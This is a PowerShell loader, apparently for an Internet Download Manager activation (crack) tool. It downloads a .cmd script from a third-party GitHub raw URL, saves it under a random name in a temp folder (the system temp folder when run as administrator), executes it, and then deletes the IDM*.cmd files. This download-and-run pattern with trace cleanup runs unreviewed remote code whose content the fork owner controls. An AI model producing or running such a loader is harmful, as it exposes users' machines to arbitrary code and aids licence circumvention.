$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://raw.githubusercontent.com/stan0ne/massgrave/main/IDM.cmd'
# $DownloadURL = 'https://raw.githubusercontent.com/WindowsAddict/IDM-Activation-Script/main/IDM.cmd'

$rand = Get-Random -Maximum 1000
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\IDM_$rand.cmd" } else { "$env:TEMP\IDM_$rand.cmd" }

$response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing

$ScriptArgs = "$args "
$prefix = "@REM $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\IDM*.cmd", "$env:SystemRoot\Temp\IDM*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
